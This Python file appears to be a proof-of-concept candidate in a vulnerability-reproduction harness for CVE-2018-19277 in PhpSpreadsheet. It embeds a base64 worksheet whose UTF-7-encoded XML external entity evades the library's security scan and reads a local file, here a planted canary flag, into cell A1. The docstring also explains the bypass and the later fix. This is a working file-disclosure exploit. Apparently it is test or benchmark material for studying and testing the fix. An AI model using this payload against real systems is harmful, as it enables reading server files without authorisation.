#!/usr/bin/env python3
"""[GIVEN] CVE-2018-19277 original PoC for xxe_phpspreadsheet_utf7.

The crafted xl/worksheets/sheet1.xml declares an XML charset OTHER than UTF-8 and encodes the
`<!DOCTYPE ... <!ENTITY xxe SYSTEM "file:///canary/flag.txt"> ...>` payload in that charset, so the
literal marker `<!DOCTYPE` is ABSENT from the raw bytes. On V0 (1.5.0) the security scan checks the
literal marker on the RAW bytes (no decode) -> misses it -> libxml decodes the UTF-7 at parse time,
resolves the external entity, and the flag is reflected into cell A1 -> flag reached.

On V1 (1.5.1) the CVE-2018-19277 fix added an mb_convert_encoding() decode to UTF-8 (using the
declared charset) BEFORE the scan -> the single-UTF-7 payload is decoded to literal `<!DOCTYPE` and
the scan catches it -> BLOCKED. (This is the differential precondition for the CVE-2019-12331 residual.)

Payload = the real PHP-mbstring UTF-7 encoding of the DOCTYPE/ENTITY body, with a literal ASCII
`<?xml ... encoding="UTF-7"?>` declaration so libxml/the scanner can detect the charset. The flag is
NOT embedded -- it is read at parse time from the planted file, so the bytes are static per run.
"""

# xl/worksheets/sheet1.xml: ascii `<?xml encoding="UTF-7"?>` + SINGLE-UTF-7-encoded DOCTYPE/ENTITY body
SHEET_SINGLE_UTF7_B64 = (
    "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTciPz4rQUR3QUlRLURPQ1RZUEUgeCAr"
    "QUZzICtBRHdBSVEtRU5USVRZIHh4ZSBTWVNURU0gK0FDSS1maWxlOi8vL2NhbmFyeS9mbGFnLnR4"
    "dCtBQ0lBUGcgK0FGMEFQZ0E4LXdvcmtzaGVldCB4bWxucytBRDBBSWctaHR0cDovL3NjaGVtYXMu"
    "b3BlbnhtbGZvcm1hdHMub3JnL3NwcmVhZHNoZWV0bWwvMjAwNi9tYWluK0FDSUFQZ0E4LXNoZWV0"
    "RGF0YStBRDRBUEEtcm93IHIrQUQwQUlnLTErQUNJQVBnQTgtYyByK0FEMEFJZy1BMStBQ0kgdCtB"
    "RDBBSWctaW5saW5lU3RyK0FDSUFQZ0E4LWlzK0FENEFQQS10K0FENEFKZy14eGUrQURzQVBBLS90"
    "K0FENEFQQS0vaXMrQUQ0QVBBLS9jK0FENEFQQS0vcm93K0FENEFQQS0vc2hlZXREYXRhK0FENEFQ"
    "QS0vd29ya3NoZWV0K0FENC0="
)


def candidate():
    return {"id": "original_single_utf7", "sheet_b64": SHEET_SINGLE_UTF7_B64}
